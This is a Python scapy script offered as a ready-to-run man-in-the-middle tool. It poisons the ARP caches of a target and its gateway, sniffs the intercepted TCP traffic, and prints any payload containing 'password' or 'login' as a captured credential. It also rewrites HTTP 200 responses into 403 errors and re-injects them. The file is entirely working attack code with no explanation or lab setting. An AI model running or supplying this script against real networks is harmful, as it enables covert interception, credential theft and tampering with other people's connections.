from scapy.all import ARP, Ether, IP, TCP, srp, send, sniff, Raw
import sys
import time
import threading
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_request
    answered = srp(arp_packet, timeout=2, verbose=False)[0]
    
    return answered[0][1].hwsrc if answered else None
def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[!] Unable to get MAC addresses. Exiting...")
        sys.exit(1)

    print(f"[*] Spoofing {target_ip} to believe we are the router ({gateway_ip})")
    print(f"[*] Spoofing {gateway_ip} to believe we are {target_ip}")

    spoof_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    spoof_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    try:
        while True:
            send(spoof_target, verbose=False)
            send(spoof_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip)
        restore_arp(gateway_ip, target_ip)
        sys.exit(0)

def restore_arp(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    
    if dest_mac is None or src_mac is None:
        return

    restore_packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(restore_packet, count=4, verbose=False)
    print(f"[*] Restored ARP for {dest_ip}")
def packet_sniff(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        if packet.haslayer(TCP) and packet.haslayer(Raw):
            raw_data = packet[Raw].load.decode(errors="ignore")
            
            if "password" in raw_data or "login" in raw_data:
                print(f"[+] Potential credential detected: {raw_data}")
            if "HTTP/1.1 200 OK" in raw_data:
                modified_data = raw_data.replace("200 OK", "403 Forbidden")
                packet[Raw].load = modified_data
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                send(packet, verbose=False)
                print("[*] HTTP Response Modified!")
def start_sniffing(interface):
    print("[*] Starting packet interception...")
    sniff(iface=interface, store=False, prn=packet_sniff)
if __name__ == "__main__":
    target_ip = ""  
    gateway_ip = ""    
    interface = ""           
    spoof_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip))
    spoof_thread.start()
    start_sniffing(interface)